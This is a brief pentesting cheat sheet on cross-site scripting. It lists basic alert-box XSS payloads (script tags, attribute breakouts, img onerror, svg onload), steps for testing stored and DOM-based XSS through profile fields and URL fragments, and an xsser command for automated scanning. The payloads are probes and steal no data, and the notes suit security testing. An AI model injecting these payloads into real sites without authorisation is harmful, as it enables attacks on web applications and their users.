# Cross-Site Scripting (XSS)

## Quick Test Payloads
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

## Persistent XSS Test
- Inject into profile fields, comments, forums
- Reload and check execution

## DOM-Based XSS Check
- Use browser dev tools console: `document.location`
- Inject: `#<script>alert(1)</script>`

## Automation

xsser --url <URL> --auto
